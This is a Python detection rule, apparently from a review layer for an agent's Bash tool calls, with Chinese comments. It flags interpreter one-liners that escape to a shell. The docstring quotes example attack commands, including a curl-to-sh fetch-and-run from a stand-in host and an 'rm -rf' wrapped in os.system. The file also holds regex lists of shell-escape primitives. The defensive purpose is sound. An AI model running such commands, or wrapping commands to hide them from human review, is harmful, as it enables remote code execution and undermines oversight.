"""bash-interpreter-shell-escape：解释器内联载荷里调用 shell / 派生进程。

解释器是通用执行器，`python3 -c "…"` 的载荷能干任何事。既有两条规则各守一半，
中间留了缝：

  bash-opaque-inline-script   只管载荷**不是字面量**（`python3 -c "$(gen)"`）
  bash-sensitive-path-scan    只管载荷里出现**敏感路径字面量**

于是「字面载荷 + 无敏感路径 + 通过 shell 逃逸干活」整条放行：

    python3 -c "import os; os.system('rm -rf /tmp/x')"
    node -e "require('child_process').execSync('curl http://x/s | sh')"
    awk 'BEGIN{system("…")}'

这类载荷的特征很干净：**它自己不干活，只是借解释器再开一个 shell**。正常的
`python3 -c "print(1+1)"`、`awk '{print $2}'` 从不需要 system()——真要跑 shell
命令，直接写 bash 就是了，绕一层解释器本身就是可疑动作。所以判别式不看载荷想
干什么（那要解析 Python，不现实），只看它是否**移交控制权给 shell**。

真实语料量过：164 条解释器字面载荷（awk 134、python 22、perl 4、node 3、ruby 1）
零命中。判别式窄到不碰日常用法，这是它能定 high 的前提。

为什么是 high 而不是 medium：载荷里的真实命令被包了一层字符串，用户在确认框里
看到的是 `python3 -c "import os; os.system(...)"`，要判断安全性得先在脑子里
反解一遍——和 LD_PRELOAD 一样，ask 只是把责任转移给看不清的人。真需要这么写，
把 shell 命令直接写成 bash 就绕开了本规则，代价极低。

不覆盖的：`os.popen` 之外用 socket 自己实现的外传、写文件再 exec 的时序拆分。
这些要运行时才成形，静态层看不见。
"""
from __future__ import annotations

import re

from ..context import BashContext
from ..helpers import normalize_cmd_name
from .base import Rule, RuleMatch
from .registry import register

# 家族 → 载荷里「把控制权交给 shell / 派生进程」的形态。
# 刻意用 (?<![.\w]) 而不是 \b：`self.system(` / `foo_system(` 是业务方法，
# 只有裸的 `system(` 才是 perl/ruby/awk 的内建。
_ESCAPES: dict[str, tuple[str, ...]] = {
    "python": (
        r"\bos\s*\.\s*(?:system|popen|exec[lv]\w*|spawn\w*)\s*\(",
        r"\bsubprocess\s*\.",
        r"\bpty\s*\.\s*spawn\s*\(",
        r"\b__import__\s*\(\s*['\"](?:os|subprocess|pty)['\"]",
    ),
    "node": (
        r"child_process",
        r"\b(?:execSync|spawnSync|execFileSync|execFile|spawn)\s*\(",
    ),
    "perl": (
        r"(?<![.\w])system\s*\(",
        r"(?<![.\w])exec\s*\(",
        r"%x\s*[\{\(]",
        r"open\s*\([^)]*\|",          # open(FH, "cmd |") 是管道执行
    ),
    "ruby": (
        r"(?<![.\w])system\s*\(",
        r"\bIO\s*\.\s*popen\b",
        r"\bOpen3\s*\.",
        r"%x\s*[\{\(]",
        r"\bspawn\s*\(",
    ),
    "php": (
        r"\b(?:shell_exec|passthru|proc_open|popen|system|exec)\s*\(",
    ),
    "lua": (
        r"\bos\s*\.\s*execute\s*\(",
        r"\bio\s*\.\s*popen\s*\(",
    ),
    "osascript": (
        r"do\s+shell\s+script",
        r"\bsystem\s+info\b",  # weak; main is do shell script
    ),
    "pwsh": (
        r"\bInvoke-Expression\b",
        r"\bIEX\b",
        r"\bStart-Process\b",
        r"\bInvoke-Command\b",
    ),
    "awk": (
        r"\bsystem\s*\(",
        r"\|\s*[\"']?\s*(?:ba|z|da|k)?sh\b",   # "cmd" | "sh"
        r"\|\s*[\"']?\s*getline",              # "cmd" | getline —— 读命令输出
        r"\bprint\b[^|]*\|\s*[\"']",           # print … | "cmd"
    ),
}

# 取内联载荷的方式分两类：选项取值 vs 首个位置参数（awk 的 program 没有选项）
_FLAG_INTERPRETERS: dict[str, tuple[str, ...]] = {
    "python": ("-c",),
    "python2": ("-c",),
    "python3": ("-c",),
    "node": ("-e", "--eval", "-p", "--print"),
    "deno": ("-e", "--eval"),
    "bun": ("-e", "--eval"),
    "perl": ("-e", "-E"),
    "ruby": ("-e",),
    "php": ("-r",),
    "lua": ("-e",),
    "osascript": ("-e",),
    "pwsh": ("-c", "-Command", "-command"),
    "powershell": ("-c", "-Command", "-command"),
    "powershell.exe": ("-c", "-Command", "-command"),
}

_POSITIONAL_INTERPRETERS = frozenset({"awk", "gawk", "mawk", "nawk"})

# 命令名 → 正则家族（python3 与 python 共用一套模式）
_FAMILY = {
    "python": "python", "python2": "python", "python3": "python",
    "node": "node", "deno": "node", "bun": "node",
    "perl": "perl", "ruby": "ruby", "php": "php",
    "lua": "lua", "osascript": "osascript",
    "pwsh": "pwsh", "powershell": "pwsh", "powershell.exe": "pwsh",
    "awk": "awk", "gawk": "awk", "mawk": "awk", "nawk": "awk",
}

_COMPILED = {
    fam: tuple(re.compile(p, re.IGNORECASE) for p in pats)
    for fam, pats in _ESCAPES.items()
}


def _flag_payloads(cmd, flags: tuple[str, ...]) -> list[str]:
    """取 `-c PAYLOAD` / `-e PAYLOAD` 里的字面载荷。

    只收 literal 非空的：`-c "$(gen)"` 的载荷运行时才成形，归
    bash-opaque-inline-script，这里重复上报只会让理由串更难读。
    """
    out: list[str] = []
    words = cmd.words
    for i, w in enumerate(words[1:], start=1):
        raw = getattr(w, "raw", "")
        if raw not in flags or i + 1 >= len(words):
            continue
        nxt = words[i + 1]
        if getattr(nxt, "literal", None):
            out.append(nxt.literal)
    return out


def _positional_payload(cmd) -> list[str]:
    """awk 的 program 是首个非选项位置参数。

    `awk -f prog.awk` 从文件读脚本，此时位置参数是数据文件而非程序——`-f` 由
    helpers 的 _OPTION_TAKES_VALUE 登记，这里靠「跳过选项及其值」自然避开。
    """
    args = cmd.args
    i = 0
    while i < len(args):
        raw = getattr(args[i], "raw", "")
        if raw in ("-f", "--file", "-v", "-F"):
            i += 2
            continue
        if raw.startswith("-") and raw != "-":
            i += 1
            continue
        lit = getattr(args[i], "literal", None)
        return [lit] if lit else []
    return []


@register
class BashInterpreterShellEscape(Rule):
    id = "bash-interpreter-shell-escape"
    severity = "high"
    applies_to = ("Bash",)
    description = "解释器内联载荷里调用 shell/派生进程，真实命令被包在字符串中"

    def match(self, ctx: BashContext) -> RuleMatch | None:
        if ctx.ast is None:
            return None
        hits: list[tuple[str, str]] = []
        for cmd in ctx.ast.commands:
            name = normalize_cmd_name(cmd.name or "")
            fam = _FAMILY.get(name)
            if fam is None:
                continue
            if name in _FLAG_INTERPRETERS:
                payloads = _flag_payloads(cmd, _FLAG_INTERPRETERS[name])
            elif name in _POSITIONAL_INTERPRETERS:
                payloads = _positional_payload(cmd)
            else:
                continue
            for payload in payloads:
                for rx in _COMPILED[fam]:
                    m = rx.search(payload)
                    if m:
                        hits.append((name, m.group(0).strip()))
                        break
        if not hits:
            return None
        pretty = "; ".join(f"{n} 载荷调用 {p}" for n, p in hits)
        return RuleMatch(
            rule_id=self.id,
            severity=self.severity,
            reason=(
                f"解释器内联载荷把控制权交给 shell：{pretty}。"
                "真实执行的命令被包在字符串里，绕过了按命令名分派的全部检查。"
                "如确需执行 shell 命令，请直接写成 bash 命令以便审查。"
            ),
            extra={"hits": [{"interpreter": n, "escape": p} for n, p in hits]},
        )
